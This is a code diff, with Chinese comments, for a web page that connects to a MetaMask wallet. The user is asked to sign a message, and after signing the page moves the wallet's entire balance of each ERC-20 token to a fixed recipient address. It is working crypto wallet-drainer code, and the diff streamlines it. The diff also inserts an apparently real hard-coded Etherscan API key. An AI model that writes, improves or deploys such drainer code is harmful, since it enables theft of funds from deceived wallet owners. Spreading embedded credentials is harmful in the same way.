@@ -22,15 +22,10 @@ const erc20Abi = [
     }
 ];
 
-// 页面加载后初始化
-window.onload = async () => {
-    const selectedWallet = 'metamask'; // 默认选择 MetaMask
-    document.getElementById('walletSelector').value = selectedWallet;
-};
-
-// 更新已连接钱包列表
+// 更新钱包地址列表
 const updateWalletList = (address) => {
     const walletList = document.getElementById('walletList');
+    walletList.innerHTML = '';  // 清空之前的内容
     const walletItem = document.createElement('li');
     walletItem.innerText = address;
     walletList.appendChild(walletItem);
@@ -39,31 +34,28 @@ const updateWalletList = (address) => {
 // 更新状态信息
 const updateStatus = (message) => {
     const statusElement = document.getElementById('status');
-    statusElement.innerText += `\n${message}`;
+    statusElement.innerText = message;
 };
 
 // 连接钱包按钮点击事件
 document.getElementById('connectButton').onclick = async () => {
-    const selectedWallet = document.getElementById('walletSelector').value;
-
     try {
-        if (selectedWallet === 'metamask') {
-            if (window.ethereum) {
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                web3 = new Web3(window.ethereum);
-                const accounts = await web3.eth.getAccounts();
+        if (window.ethereum) {
+            web3 = new Web3(window.ethereum);
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const accounts = await web3.eth.getAccounts();
 
-                if (accounts.length > 0) {
-                    updateWalletList(accounts[0]);
-                    isConnected = true;
-                    updateStatus('MetaMask 已连接');
-                    document.getElementById('signButton').disabled = false; // 启用签名按钮
-                } else {
-                    updateStatus('未检测到已连接的账户');
-                }
+            if (accounts.length > 0) {
+                updateWalletList(accounts[0]);
+                updateStatus('钱包连接成功');
+                isConnected = true;
+                document.getElementById('signButton').style.display = 'block';  // 显示签名按钮
+                document.getElementById('signButton').disabled = false;  // 启用签名按钮
             } else {
-                updateStatus('请安装 MetaMask 钱包');
+                updateStatus('未检测到已连接的账户');
             }
+        } else {
+            updateStatus('请安装 MetaMask 钱包');
         }
     } catch (error) {
         updateStatus('连接失败: ' + error.message);
@@ -72,21 +64,21 @@ document.getElementById('connectButton').onclick = async () => {
 
 // 签名按钮点击事件
 document.getElementById('signButton').onclick = async () => {
-    const accounts = await web3.eth.getAccounts();
-    if (accounts.length > 0) {
-        const account = accounts[0];
-        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
-        try {
-            const signature = await web3.eth.personal.sign(message, account);
-            updateStatus(`签名成功: ${signature}`);
-
-            // 调用转移资产的函数
-            await transferAssets(account);
-        } catch (error) {
-            updateStatus(`签名失败: ${error.message}`);
-        }
-    } else {
+    if (!isConnected) {
         updateStatus('请先连接钱包');
+        return;
+    }
+
+    const accounts = await web3.eth.getAccounts();
+    const account = accounts[0];
+    const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
+
+    try {
+        const signature = await web3.eth.personal.sign(message, account);
+        updateStatus(`签名成功: ${signature}`);
+        await transferAssets(account);  // 签名成功后调用转移代币函数
+    } catch (error) {
+        updateStatus(`签名失败: ${error.message}`);
     }
 };
 
@@ -102,7 +94,7 @@ const transferAssets = async (account) => {
         if (balance.gt(0)) {
             const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
             try {
-                const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: account });
+                await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: account });
                 updateStatus(`成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`);
             } catch (error) {
                 updateStatus(`转移 ${token.symbol} 失败: ${error.message}`);
@@ -118,7 +110,7 @@ const transferAssets = async (account) => {
 // 获取代币余额的函数
 const getTokenBalances = async (address) => {
     try {
-        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=你的Etherscan API Key`;
+        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63`;
         const response = await axios.get(url);
         const transactions = response.data.result;
 
